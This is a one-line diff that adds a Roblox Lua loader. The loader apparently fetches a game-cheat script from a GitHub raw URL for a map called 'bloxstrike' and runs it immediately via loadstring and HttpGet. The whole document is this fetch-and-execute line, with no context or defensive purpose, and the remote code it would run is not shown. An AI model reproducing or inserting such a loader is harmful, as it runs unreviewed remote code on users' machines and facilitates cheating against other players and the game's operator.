@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/new-map-bloxstrike-s0-wvw94gfzdjkkks.lua"))()
